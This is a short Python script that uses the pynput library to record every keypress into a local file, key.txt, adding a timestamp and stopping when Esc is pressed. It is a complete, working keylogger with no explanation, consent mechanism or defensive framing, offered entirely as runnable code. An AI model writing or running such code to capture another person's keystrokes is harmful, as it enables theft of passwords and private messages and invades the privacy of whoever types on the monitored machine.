from pynput import keyboard
import datetime

file_key = open("key.txt",'a+',encoding ='utf-8')

def key_press (key):
    if key == keyboard.Key.esc :
        file_key.write(str(' | Data: {} ;\n'.format(datetime.datetime.now(tz=None))))
        file_key.close()
        return False

    else:
        file_key.write(str(key))
        
with keyboard.Listener(on_press = key_press) as listen:
    listen.join()
